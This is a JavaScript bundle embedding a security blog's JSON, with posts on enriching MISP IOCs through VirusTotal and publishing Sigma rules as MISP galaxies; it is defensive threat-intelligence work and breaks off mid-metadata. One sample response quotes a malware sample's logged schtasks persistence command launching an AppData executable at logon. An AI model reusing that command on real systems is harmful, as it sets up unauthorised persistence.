"use strict";(self.webpackChunkjstnk=self.webpackChunkjstnk||[]).push([[7262],{2725:function(e){e.exports=JSON.parse('{"blogPosts":[{"id":"MISP-object-creator-with-Virustotal-and-Sigma","metadata":{"permalink":"/jstnk9/blog/MISP-object-creator-with-Virustotal-and-Sigma","source":"@site/blog/2023-06-14-MISP-object-creator-with-Virustotal-and-Sigma/2023-06-14-MISP-object-creator-with-Virustotal-and-Sigma.md","title":"MISP object creator with VirusTotal and Sigma Galaxies","description":"TL;DR\u200b","date":"2023-06-14T00:00:00.000Z","formattedDate":"June 14, 2023","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"blue team","permalink":"/jstnk9/blog/tags/blue-team"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"MISP","permalink":"/jstnk9/blog/tags/misp"},{"label":"detection engineering","permalink":"/jstnk9/blog/tags/detection-engineering"},{"label":"sigma","permalink":"/jstnk9/blog/tags/sigma"},{"label":"virustotal","permalink":"/jstnk9/blog/tags/virustotal"},{"label":"threat hunting","permalink":"/jstnk9/blog/tags/threat-hunting"}],"readingTime":5.77,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"nextItem":{"title":"Sigma Rules as MISP galaxies (II)","permalink":"/jstnk9/blog/Sigma-Rules-as-MISP-galaxies-02"}},"content":"## TL;DR\u200b \\r\\n\\r\\nI have created a new script to automate the ingestion of IOCs in MISP in object format. This script also automatically consumes information from VirusTotal to enrich the IOCs in case of exist in VT. However, the most interesting thing about this script is that it is able to automatically obtain the Sigma rules and MITRE techniques of the IOCs that we want to store in MISP, and add this information as Galaxies.\\r\\n\\r\\nThe stored galaxies are at the event level and at the object level, i.e. the event will have the total number of galaxies related to Sigma rules and MITRE techniques. Each object will have only the galaxies related to its behavior.\\r\\n\\r\\nAll you need to use the script is a VT API Key and to have the Sigma and MITRE galaxies in your instance. Since 2022-11-28 the Sigma galaxy [is embedded](https://github.com/MISP/misp-galaxy/blob/main/clusters/sigma-rules.json) in the default version of MISP. In case you don\'t have it, I recommend you to read [this blog](https://jstnk9.github.io/jstnk9/blog/Sigma-Rules-as-MISP-galaxies) and [use the script I made](https://github.com/jstnk9/MISP/tree/main/misp-galaxy/sigma) to create the sigma rules galaxy.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Object creator\\r\\n\\r\\nObject creator is a python script that helps you to add IOCs (in object format) in your MISP with extra information and galaxies automatically. The information is retrieved from VirusTotal using the API Key. If the IOC is in VT, the information extracted is as follows:\\r\\n\\r\\n* Files\\r\\n  * Sha256\\r\\n  * MD5\\r\\n  * Sha1\\r\\n  * ssdeep\\r\\n  * vhash\\r\\n  * tlsh\\r\\n  * mimetype\\r\\n  * filenames\\r\\n  * magic\\r\\n  * MITRE Techniques as MISP Galaxies\\r\\n  * Sigma rules as MISP Galaxies\\r\\n* IPs\\r\\n  * IP\\r\\n  * ASN\\r\\n  * Country code\\r\\n  * network\\r\\n  * ASN Owner\\r\\n* Domains\\r\\n  * Domain\\r\\n  * Registration date\\r\\n  * Resolutions\\r\\n* URLs \\r\\n  * URL\\r\\n  * Host\\r\\n  * Port\\r\\n  * Resource Path\\r\\n  * Query string\\r\\n* Event\\r\\n  * All the MITRE Techniques extracted from the files stored in the MISP event\\r\\n  * All the Sigma rules extracted from the files stored in the MISP event\\r\\n\\r\\nNowadays not all VirusTotal samples have MITRE and Sigma Rules techniques. In the case of Sigma Rules, it is sometimes difficult to obtain results, especially depending on the file type. In general, binaries usually get good results with the associated sigma rules, but some office documents do not always get the expected results.\\r\\n\\r\\nIt is important to mention that the Sigma rules that VirusTotal has at its disposal are essentially those from the public Sigma GitHub. They also have other sigma rules from vendors related to Sandboxing. How VirusTotal relates sample behaviors to Sigma rules is unknown.\\r\\n\\r\\n### Sigma rules from VirusTotal\\r\\n\\r\\nTo obtain the Sigma rules information from a file, the [endpoint](https://developers.virustotal.com/reference/file-info) of `files` is queried. The returned object contains a key called `sigma_analysis_results` which stores information about the sigma rules that could be related.\\r\\n\\r\\nAnother associated value information is the log where the match could be obtained in the `match_context` key. Currently nothing is being done with that value in this script, however it is likely that some of the information it incorporates will be added in some objects :-).\\r\\n\\r\\nThe following object is an example obtained through the sample `1641c9494dd3eabd7131add274804d83a308eecb241a56931ce045412c32f0a26f` in VirusTotal.\\r\\n\\r\\n```json\\r\\n{\\r\\n    \\"rule_title\\": \\"Suspicious Schtasks From Env Var Folder\\",\\r\\n    \\"rule_source\\": \\"Sigma Integrated Rule Set (GitHub)\\",\\r\\n    \\"match_context\\": [\\r\\n    {\\r\\n        \\"values\\": {\\r\\n        \\"TerminalSessionId\\": \\"1\\",\\r\\n        \\"ProcessGuid\\": \\"{C784477D-A7ED-643C-F905-000000004400}\\",\\r\\n        \\"ProcessId\\": \\"3144\\",\\r\\n        \\"Product\\": \\"Microsoft\\\\\\\\xae Windows\\\\\\\\xae Operating System\\",\\r\\n        \\"Description\\": \\"Task Scheduler Configuration Tool\\",\\r\\n        \\"Company\\": \\"Microsoft Corporation\\",\\r\\n        \\"ParentProcessGuid\\": \\"{C784477D-A7EC-643C-F505-000000004400}\\",\\r\\n        \\"User\\": \\"DESKTOP-B0T93D6\\\\\\\\george\\",\\r\\n        \\"Hashes\\": \\"MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69\\",\\r\\n        \\"OriginalFileName\\": \\"schtasks.exe\\",\\r\\n        \\"ParentImage\\": \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\\",\\r\\n        \\"FileVersion\\": \\"10.0.17134.1 (WinBuild.160101.0800)\\",\\r\\n        \\"ParentProcessId\\": \\"4524\\",\\r\\n        \\"CurrentDirectory\\": \\"C:\\\\\\\\Users\\\\\\\\george\\\\\\\\Desktop\\\\\\\\\\",\\r\\n        \\"CommandLine\\": \\"schtasks  /create /f /sc onlogon /rl highest /tn \\\\\\"t-launcher\\\\\\" /tr \'\\\\\\"C:\\\\\\\\Users\\\\\\\\george\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\t-launcher.exe\\\\\\"\' \\",\\r\\n        \\"EventID\\": \\"1\\",\\r\\n        \\"LogonGuid\\": \\"C784477D-1D0C-6407-0BA7-030000000000\\",\\r\\n        \\"LogonId\\": \\"239371\\",\\r\\n        \\"Image\\": \\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\schtasks.exe\\",\\r\\n        \\"IntegrityLevel\\": \\"High\\",\\r\\n        \\"ParentCommandLine\\": \\"\\\\\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\\\\\\" /c schtasks /create /f /sc onlogon /rl highest /tn \\\\\\"t-launcher\\\\\\" /tr \'\\\\\\"C:\\\\\\\\Users\\\\\\\\george\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\t-launcher.exe\\\\\\"\' & exit\\",\\r\\n        \\"UtcTime\\": \\"1681696749\\",\\r\\n        \\"RuleName\\": \\"-\\"\\r\\n        }\\r\\n    }\\r\\n    ],\\r\\n    \\"rule_level\\": \\"high\\",\\r\\n    \\"rule_id\\": \\"0533322c5c44794b71e761cd351a2459aad6e21ae95c9543d4c9fdb3c8fde6c4\\",\\r\\n    \\"rule_author\\": \\"Florian Roth (Nextron Systems)\\",\\r\\n    \\"rule_description\\": \\"Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware\\"\\r\\n}\\r\\n```\\r\\n\\r\\nAs you can see, among the information obtained is the `id` of the rule, `author`, `title` and other information. In this case, the necessary information would be the name of the rule, which is the same that will be previously stored in the Sigma galaxy.\\r\\n\\r\\n:::info INFORMATION\\r\\n\\r\\nIn case the sigma rule identified in the sample through VirusTotal is not found in the public Sigma GitHub, such rule will be added as a `Tag` and not as a `Galaxy`, since it will not be previously stored.\\r\\n\\r\\n:::\\r\\n\\r\\nThe sigma rules will be added in two different ways. The first one is globally in the event. For example, if we want to add 5 IOCs in a MISP event and the total of sigma rules identified in those 5 samples are 17 rules, 17 new galaxies will be created in the MISP event. On the other hand, for each of the 5 IOCs an object is generated as an attribute, and each object will have related sigma rules that have been seen in its behavior. In this way, the event and each object are characterized globally.\\r\\n\\r\\n### MITRE Techniques from VirusTotal\\r\\n\\r\\nThe same way that the sigma rules are obtained is done with the MITRE techniques. In this case the [endpoint](https://developers.virustotal.com/reference/get-all-behavior-reports-for-a-file) is different, since information is consumed from the behavior, being `behaviour_mitre_trees`.\\r\\n\\r\\nCurrently the information from the `Zenbox` sandbox is consumed, but it is planned to add the value of other sandboxes. The reason for choosing `Zenbox` is because it is usually the sandbox that obtains more results from the analyzed samples.\\r\\n\\r\\nAn example of a response obtained from VirusTotal could be as follows.\\r\\n\\r\\n```json\\r\\n\\"mitre_attack_techniques\\": [\\r\\n    {\\r\\n        \\"signature_description\\": \\"Creates files inside the user directory\\",\\r\\n        \\"id\\": \\"T1036\\",\\r\\n        \\"severity\\": \\"IMPACT_SEVERITY_INFO\\"\\r\\n    },\\r\\n    {\\r\\n        \\"signature_description\\": \\"Sample is packed with UPX\\",\\r\\n        \\"id\\": \\"T1027.002\\",\\r\\n        \\"severity\\": \\"IMPACT_SEVERITY_INFO\\"\\r\\n    },\\r\\n    {\\r\\n        \\"signature_description\\": \\"PE file has section (not .text) which is very likely to contain packed code (zlib compression ratio < 0.011)\\",\\r\\n        \\"id\\": \\"T1027.002\\",\\r\\n        \\"severity\\": \\"IMPACT_SEVERITY_INFO\\"\\r\\n    }\\r\\n]\\r\\n```\\r\\n\\r\\n### Event Creation\\r\\n\\r\\nAt a high level, the process to create a new event in MISP based on the IOCs you want to store is as follows.\\r\\n\\r\\n![process](https://jstnk9.github.io/jstnk9/img/blog-object-creator/graph.png)\\r\\n\\r\\nAs stated above, galaxies are stored both in the objects and in the event itself. This will allow us to identify the exact sigma rules and techniques used by a specific sample.\\r\\n\\r\\nAn example of an object created with the information extracted from VirusTotal to enrich it and with the corresponding galaxies would be the following.\\r\\n\\r\\n![objectimage](https://jstnk9.github.io/jstnk9/img/blog-object-creator/object_created.png)\\r\\n\\r\\nAs for the event, as explained it will contain all the galaxies of all the objects. An example of an event created from the ingestion of 7 IOCs is the following.\\r\\n\\r\\n![eventcreated](https://jstnk9.github.io/jstnk9/img/blog-object-creator/event.png)\\r\\n\\r\\n### GitHub Repo\\r\\n\\r\\nIf you want to use this script and get more information about how to use it, please go to the [public GitHub](https://github.com/jstnk9/MISP/tree/main/object-creator/\\r\\n) repo.\\r\\n\\r\\nI have in mind to improve this script. During the next months I will be updating the GitHub repo.\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/\\r\\n\\r\\n**GitHub Project**: https://github.com/jstnk9/MISP/tree/main/object-creator"},{"id":"Sigma-Rules-as-MISP-galaxies-02","metadata":{"permalink":"/jstnk9/blog/Sigma-Rules-as-MISP-galaxies-02","source":"@site/blog/2023-01-11-Sigma-Rules-as-MISP-galaxies-02/2023-01-11-Sigma-Rules-as-MISP-galaxies-02.md","title":"Sigma Rules as MISP galaxies (II)","description":"Before reading this blog I recommend you to read the first part of it//jstnk9.github.io/jstnk9/blog/Sigma-Rules-as-MISP-galaxies","date":"2023-01-11T00:00:00.000Z","formattedDate":"January 11, 2023","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"blue team","permalink":"/jstnk9/blog/tags/blue-team"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"MISP","permalink":"/jstnk9/blog/tags/misp"},{"label":"detection engineering","permalink":"/jstnk9/blog/tags/detection-engineering"},{"label":"sigma","permalink":"/jstnk9/blog/tags/sigma"}],"readingTime":3.055,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"MISP object creator with VirusTotal and Sigma Galaxies","permalink":"/jstnk9/blog/MISP-object-creator-with-Virustotal-and-Sigma"},"nextItem":{"title":"Sigma Rules as MISP galaxies","permalink":"/jstnk9/blog/Sigma-Rules-as-MISP-galaxies"}},"content":":::info ICYMI\\r\\n\\r\\nBefore reading this blog I recommend you to read the first part of it: https://jstnk9.github.io/jstnk9/blog/Sigma-Rules-as-MISP-galaxies\\r\\n\\r\\nMISP has already added this galaxy to its [repository](https://github.com/MISP/misp-galaxy).\\r\\n\\r\\nCluster: https://github.com/MISP/misp-galaxy/blob/main/clusters/sigma-rules.json\\r\\n\\r\\nGalaxy: https://github.com/MISP/misp-galaxy/blob/main/galaxies/sigma-rules.json\\r\\n:::\\r\\n\\r\\n## Version 2.0 \\r\\n\\r\\nDuring the last weeks, I have been working on the script to improve it and to allow in this new version that I have recently published, the possibility to add relations in the galaxy with another already existing MITRE ATT&CK. This, among other things allows to know in a quick and visual way which sigma rule is related to which technique within MISP. \\r\\n\\r\\nSuppose you have an event in MISP that is mapped to 5 MITRE ATT&CK techniques. Now, by clicking on those techniques and expanding the relationships, you will be able to see if there is any sigma rule that can cover any behavior of the expanded technique.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## ATT&CK MITRE Galaxy \\r\\n\\r\\nIf you have MISP deployed, you probably use the MITRE ATT&CK galaxy. That galaxy is found by default when you install MISP, as is the Sigma galaxy now. You can find it here [mitre-attack-pattern.json](https://github.com/MISP/misp-galaxy/blob/main/clusters/mitre-attack-pattern.json).\\r\\n\\r\\nIf we access to any cluster of our galaxy, there is a button where it says `Toggle Cluster relationships`, clicking on it, we can see the relationships that this cluster has.\\r\\n\\r\\n![galaxy01](https://jstnk9.github.io/jstnk9/img/blog-sigma-misp2/showrelation.png)\\r\\n\\r\\nSubsequently, the drop-down list will open with the relationships that the sigma rule has with the MITRE techniques, in case there is any relationship.\\r\\n\\r\\n![galaxy02](https://jstnk9.github.io/jstnk9/img/blog-sigma-misp2/1relation.jpg)\\r\\n\\r\\nOn the contrary, if we access the cluster of a MITRE ATT&CK technique, we can see all the relationships it has, such as tools, MITRE mitigations and also, our sigma rules.\\r\\n\\r\\n![galaxy03](https://jstnk9.github.io/jstnk9/img/blog-sigma-misp2/2relation.jpg)\\r\\n\\r\\n## Generate the galaxy\\r\\n\\r\\nTo generate the galaxy is very simple. The first thing to do is to clone the repository and install the requirements from the file [`requirements.txt`](https://github.com/jstnk9/MISP/blob/main/misp-galaxy/sigma/requirements.txt). It is important to mention that `python3` is required to run the script.\\r\\n\\r\\n```bash\\r\\npip3 install -r requirements\\r\\n```\\r\\n\\r\\nOnce installed, something new in this 2.0 version is the file [`config.ini`](https://github.com/jstnk9/MISP/blob/main/misp-galaxy/sigma/config.ini). The inclusion of this file is necessary so that the user who is going to execute the script, indicates the path where the galaxy related to MITRE ATT&CK is located. Generally, the directory will be the one indicated in this file, however, if the installation was done outside `/var/www/MISP`, it is important that you modify it.\\r\\n\\r\\n```\\r\\n[MISP]\\r\\ncluster_path = /var/www/MISP/app/files/misp-galaxy/clusters/\\r\\nmitre_attack_cluster = mitre-attack-pattern.json\\r\\n```\\r\\n\\r\\nThe content of the `cluster_path` variable contains the path where the MISP clusters are located. On the other hand, the content of the variable `mitre_attack_cluster` is the ATT&CK MITRE cluster with the MITRE techniques and tactics.\\r\\n\\r\\nOnce we make sure that the configuration file contains the correct information, we will need to have cloned the [Sigma Rules repository](https://github.com/SigmaHQ/sigma). If instead of using the Sigma Rules repository we want to use our own sigma rules, we can also do this (just change the path in the `-p` parameter). In this case, we will use the original repository and run the following command to generate the galaxy and the cluster.\\r\\n\\r\\n```bash\\r\\npython3 sigma-to-galaxy.py -r -p /opt/sigma/rules\\r\\n```\\r\\n\\r\\nThe `-p` parameter is used to indicate the path where our sigma rules are located. The `-r` parameter indicates that it is executed recursively, that is, if within the `/opt/sigma/rules` directory there are subfolders with more rules, these will be incorporated.\\r\\n\\r\\nFinished, we will obtain the two files of the galaxies and clusters that we will have to put in their corresponding folder, as it was indicated in the [first blog](https://jstnk9.github.io/jstnk9/blog/Sigma-Rules-as-MISP-galaxies).\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/\\r\\n\\r\\n**GitHub Project**: https://github.com/jstnk9/MISP\\r\\n\\r\\n**Mastodon**: `@Joseliyo_Jstnk@infosec.exchange`\\r\\n\\r\\n<h2> References </h2>\\r\\n\\r\\n* https://www.misp-project.org/misp-training/a.10-galaxy-2.0.pdf\\r\\n* https://twitter.com/adulau/status/1611386536225902596\\r\\n* https://github.com/SigmaHQ/sigma\\r\\n* https://github.com/MISP/misp-galaxy\\r\\n* https://github.com/jstnk9/MISP/tree/main/misp-galaxy/sigma\\r\\n* https://www.misp-project.org/galaxy.html\\r\\n* https://jstnk9.github.io/jstnk9/blog/Sigma-Rules-as-MISP-galaxies"},{"id":"Sigma-Rules-as-MISP-galaxies","metadata":{"permalink":"/jstnk9/blog/Sigma-Rules-as-MISP-galaxies","source":"@site/blog/2022-12-13-Sigma-Rules-as-MISP-galaxies/2022-12-13-Sigma-Rules-as-MISP-galaxies.md","title":"Sigma Rules as MISP galaxies","description":"A threat intelligence analyst\'s brief","date":"2022-12-13T00:00:00.000Z","formattedDate":"December 13, 2022","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"blue team","permalink":"/jstnk9/blog/tags/blue-team"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"MISP","permalink":"/jstnk9/blog/tags/misp"},{"label":"detection engineering","permalink":"/jstnk9/blog/tags/detection-engineering"},{"label":"sigma","permalink":"/jstnk9/blog/tags/sigma"}],"readingTime":6.385,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Sigma Rules as MISP galaxies (II)","permalink":"/jstnk9/blog/Sigma-Rules-as-MISP-galaxies-02"},"nextItem":{"title":"TIBER-EU and TIBER-ES - Blue Team","permalink":"/jstnk9/blog/TIBER-EU-ES-Blue-Team-Series-01"}},"content":"## A threat intelligence analyst\'s brief\\r\\n\\r\\nIn the threat intelligence world, we are continuously analyzing threat actors and threats in general that impact different sectors. From a threat intelligence analyst\'s point of view, it is important to know the motivations, objectives, TTPs and the overall context of the intrusion.\\r\\n\\r\\nThe results produced by these analysts are usually well defined. Frequently, a report is generated with a series of sections, where some of them are usually `conclusions`, `recommendations`, `countermeasures`.... Perhaps the least fun part for a threat intelligence analyst.\\r\\n\\r\\nAlso, in many cases additional products are generated and sent along with the report, such as STIX files with the analysis information, CSV files with IOCs, YARA rules and others. Another thing that most threat intelligence teams do is to dump all the information from the report into `MISP` including TTPs, IOCs and context information to help categorize, filter and relate the events.\\r\\n\\r\\nFrom a threat intelligence point of view, our work should stop there. However, when it comes to generating a good security strategy, it is important to be able to map the techniques and behaviors identified in each intrusion with different types of rules, whether they are network or behavior-based endpoint rules.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## From threat intelligence w/ detection engineering \\r\\n\\r\\nMany threat intelligence analysts are in fact in charge of creating such detection rules based on their own research or intrusion analysis. Realistically, however, this need not be the job of these analysts. \\r\\n\\r\\nDetection engineers are the responsible for creating these rules to improve detections and, in some cases, visibility. Although it is true, they sometimes need help from threat intelligence analysts to understand and have context about what they want to detect and know what is happening in the wild.\\r\\n\\r\\n## Add more value to your MISP events\\r\\n\\r\\nAs mentioned in previous points, surely as a threat intelligence analyst you usually create MISP events with IOCs and context information, such as MITRE techniques, malware families, affected countries, etc... All using MISP galaxies.\\r\\n\\r\\nAdding galaxy-like sigma rules to your event would add value? Imagine analyzing an intrusion, identifying that there are multiple sigma rules that could have detected different behaviors, then adding those rules as galaxies.\\r\\n\\r\\nJust for this purpose I have created a [script](https://github.com/jstnk9/MISP/tree/main/misp-galaxy/sigma) that allows to generate galaxies in MISP from [Sigma Rules](https://github.com/SigmaHQ/sigma). A few months ago, I [generated a script](https://github.com/jstnk9/TIBER-Cases/tree/main/scripts/sigma-taxonomy-generator) and [published](https://twitter.com/Joseliyo_Jstnk/status/1547187670069248000) to create taxonomies in MISP from Sigma Rules, however, I realized that there was some context information about the rule that was missing, and I had to go into the repository itself to get it. Also, it used the rule name as the taxonomy value instead of the rule title.\\r\\n\\r\\nUnlike MISP taxonomies, galaxies were created just for that, they allow to add more context than taxonomies, and that is why I decided to improve the previous script to create galaxies instead of taxonomies.\\r\\n\\r\\nThe idea is that from a path that you indicate to the script with the place where you have stored the rules, this begins to look for them and begins to parse them to generate two types of files. The reason of doing it through a path and not from the oficial repository is because it could be the case that there are private sigma rules that have not been shared and you want to generate the galaxy in MISP in the same way.\\r\\n\\r\\n* Sigma-rules.json (cluster): This file must be placed inside the `/var/www/MISP/app/ files/misp-galaxy/clusters` directory as it contains the Sigma-rules information itself. A part of this JSON is the one we can see below.\\r\\n\\r\\n```json\\r\\n{\\r\\n    \\"authors\\": [\\r\\n        \\"@Joseliyo_Jstnk\\"\\r\\n    ],\\r\\n    \\"category\\": \\"rules\\",\\r\\n    \\"description\\": \\"MISP galaxy cluster based on Sigma Rules.\\",\\r\\n    \\"name\\": \\"Sigma-Rules\\",\\r\\n    \\"source\\": \\"https://github.com/jstnk9/MISP/tree/main/misp-galaxy/sigma\\",\\r\\n    \\"type\\": \\"sigma-rules\\",\\r\\n    \\"uuid\\": \\"9cf7cd2e-d5f1-48c4-9909-7896ba1c96b2\\",\\r\\n    \\"values\\": [\\r\\n        {\\r\\n            \\"description\\": \\"Detects a highly relevant Antivirus alert that reports an exploitation framework\\",\\r\\n            \\"uuid\\": \\"238527ad-3c2c-4e4f-a1f6-92fd63adb864\\",\\r\\n            \\"value\\": \\"Antivirus Exploitation Framework Detection\\",\\r\\n            \\"meta\\": {\\r\\n                \\"refs\\": [\\r\\n                    \\"https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/\\",\\r\\n                    \\"https://github.com/SigmaHQ/sigma/tree/master/rules/application/antivirus/av_exploiting.yml\\"\\r\\n                ],\\r\\n                \\"tags\\": [\\r\\n                    \\"attack.execution\\",\\r\\n                    \\"attack.t1203\\",\\r\\n                    \\"attack.command_and_control\\",\\r\\n                    \\"attack.t1219\\"\\r\\n                ],\\r\\n                \\"creation_date\\": \\"2018/09/09\\",\\r\\n                \\"filename\\": \\"av_exploiting.yml\\",\\r\\n                \\"author\\": \\"Florian Roth\\",\\r\\n                \\"level\\": \\"critical\\",\\r\\n                \\"falsepositive\\": [\\r\\n                    \\"Unlikely\\"\\r\\n                ],\\r\\n                \\"logsource.category\\": \\"antivirus\\",\\r\\n                \\"logsource.product\\": \\"No established product\\"\\r\\n            }\\r\\n        }\\r\\n        .......\\r\\n```\\r\\nAs can be seen in the above code fragment, most of the fields in the sigma rules are mapped. For those cases where the text **Not established [something]** appears, it is because the field doesn\'t exist in the rule.\\r\\n\\r\\nSomething that I didn\'t want to map (because I wanna think more about it) but I\'m dealing with is the logic of the rule for itself. It can be difficult because the fields are dynamic.\\r\\n\\r\\n* Sigma-rules.json (galaxies): This file must be placed inside the `/var/www/MISP/app/files/misp-galaxy/galaxies` directory and simply contains information about the galaxy, which will be required later in order to be used.\\r\\n\\r\\n```json\\r\\n{\\r\\n    \\"description\\": \\"Sigma Rules are used to detect suspicious behaviors related to threat actors, malware and tools\\",\\r\\n    \\"icon\\": \\"link\\",\\r\\n    \\"name\\": \\"Sigma-Rules\\",\\r\\n    \\"namespace\\": \\"misp\\",\\r\\n    \\"type\\": \\"sigma-rules\\",\\r\\n    \\"uuid\\": \\"9cf7cd2e-d5f1-48c4-9909-7896ba1c96b2\\",\\r\\n    \\"version\\": 1\\r\\n}\\r\\n```\\r\\nIf you want to learn more about how galaxies work and how to create one, you can do it here https://www.misp-project.org/2020/07/31/MISP-galaxy-101.html/.\\r\\n\\r\\n## How it looks?\\r\\n\\r\\nOnce we have the imported galaxy in our MISP, if we navigate to it we can see something like this.\\r\\n\\r\\n![galaxy01](https://jstnk9.github.io/jstnk9/img/blog-sigma-misp/galaxy01.png)\\r\\n\\r\\nThe value of each item is the name of the rule, not the name of the file. This may help us in the future to do some extra implementation as well as give us much more context.\\r\\n\\r\\nIf we see the detail of any of these items, we can obtain the fields of the rule with the context information.\\r\\n\\r\\n![galax02](https://jstnk9.github.io/jstnk9/img/blog-sigma-misp/galaxy02.png)\\r\\n\\r\\n![galaxy03](https://jstnk9.github.io/jstnk9/img/blog-sigma-misp/galaxy03.png)\\r\\n\\r\\nThe more events we have stored with galaxy values on sigma rules, the more interesting the actions and statistics we can execute in the future with this information. Questions like... Which rules are detecting the most behaviors? Which logsource is giving me more information? Where do I have less visibility because I have less mapped rules? They could be answered, based on the events that are analyzed by the CTI teams in MISP.\\r\\n\\r\\nAn example could be to identify the Sigma rules that are detecting more behaviors, in order to improve them or to see the data sources that are giving us more detection value. This can be achieved using a script called `stats_report.py` which can be found [here](https://github.com/MISP/PyMISP/blob/main/examples/stats_report.py). By running it and filtering by the dates we are interested in, we can obtain a list of sigma rules and the number of events where they appear.\\r\\n\\r\\n```bash\\r\\n(myenv) misp@misp:/opt/scripts/misp_statistics# python3 stats_report.py -f 2022-09-01 -u 2022-11-16 | grep sigma\\r\\nmisp-galaxy:sigma-rules=\\"Failed Code Integrity Checks\\"   6\\r\\nmisp-galaxy:sigma-rules=\\"Wow6432Node CurrentVersion Autorun Keys Modification\\"   4\\r\\nmisp-galaxy:sigma-rules=\\"Creation of an Executable by an Executable\\"     4\\r\\nmisp-galaxy:sigma-rules=\\"Suspicious Execution of Taskkill\\"       3\\r\\nmisp-galaxy:sigma-rules=\\"Process Creation Using Sysnative Folder\\"        3\\r\\nmisp-galaxy:sigma-rules=\\"Powershell Create Scheduled Task\\"       3\\r\\nmisp-galaxy:sigma-rules=\\"CurrentVersion Autorun Keys Modification\\"       3\\r\\nmisp-galaxy:sigma-rules=\\"Windows Processes Suspicious Parent Directory\\"          2\\r\\nmisp-galaxy:sigma-rules=\\"Windows Cmd Delete File\\"        2\\r\\nmisp-galaxy:sigma-rules=\\"User with Privileges Logon\\"     2\\r\\nmisp-galaxy:sigma-rules=\\"Use Remove-Item to Delete File\\"         2\\r\\nmisp-galaxy:sigma-rules=\\"System File Execution Location Anomaly\\"         2\\r\\nmisp-galaxy:sigma-rules=\\"Rundll32 With Suspicious Parent Process\\"        2\\r\\nmisp-galaxy:sigma-rules=\\"Remote Thread Creation in Suspicious Targets\\"   2\\r\\nmisp-galaxy:sigma-rules=\\"Reg Add RUN Key\\"        2\\r\\nmisp-galaxy:sigma-rules=\\"Python Initiated Connection\\"    2\\r\\nmisp-galaxy:sigma-rules=\\"Process Start From Suspicious Folder\\"   2\\r\\nmisp-galaxy:sigma-rules=\\"Execution from Suspicious Folder\\"       2\\r\\n```\\r\\n\\r\\nIn case you want to consult the information in JSON format, you can always visit the following URL to obtain it http://yourmisp.com/users/statistics/tags.json.\\r\\n\\r\\n## Next steps\\r\\n\\r\\nMISP incorporates a very interesting functionality that allows to add **relationships** to several clusters. That is why, in future updates, I would like to add different relationships to the Sigma galaxy such as MITRE Techniques, Software, Groups, etc.\\r\\n\\r\\nMore information about relationships and galaxies here: https://www.misp-project.org/misp-training/a.10-galaxy-2.0.pdf\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/\\r\\n\\r\\n**GitHub Project**: https://github.com/jstnk9/MISP\\r\\n\\r\\n**Mastodon**: `@Joseliyo_Jstnk@infosec.exchange`\\r\\n\\r\\n<h2> References </h2>\\r\\n\\r\\n* https://www.misp-project.org/misp-training/a.10-galaxy-2.0.pdf\\r\\n* https://www.vanimpe.eu/2019/07/13/generating-misp-data-statistical-reports/\\r\\n* https://github.com/SigmaHQ/sigma\\r\\n* https://github.com/MISP/misp-galaxy\\r\\n* https://www.misp-project.org/galaxy.html"},{"id":"TIBER-EU-ES-Blue-Team-Series-01","metadata":{"permalink":"/jstnk9/blog/TIBER-EU-ES-Blue-Team-Series-01","source":"@site/blog/2022-07-11-TIBER-EUES-Blue-Team-Series-01/2022-07-11-TIBER-EUES-Blue-Team-Series-01.md","title":"TIBER-EU and TIBER-ES - Blue Team","description":"TL;DR","date":"2022-07-11T00:00:00.000Z","formattedDate":"July 11, 2022","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"blue team","permalink":"/jstnk9/blog/tags/blue-team"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"risk","permalink":"/jstnk9/blog/tags/risk"},{"label":"threat modeling","permalink":"/jstnk9/blog/tags/threat-modeling"},{"label":"financial 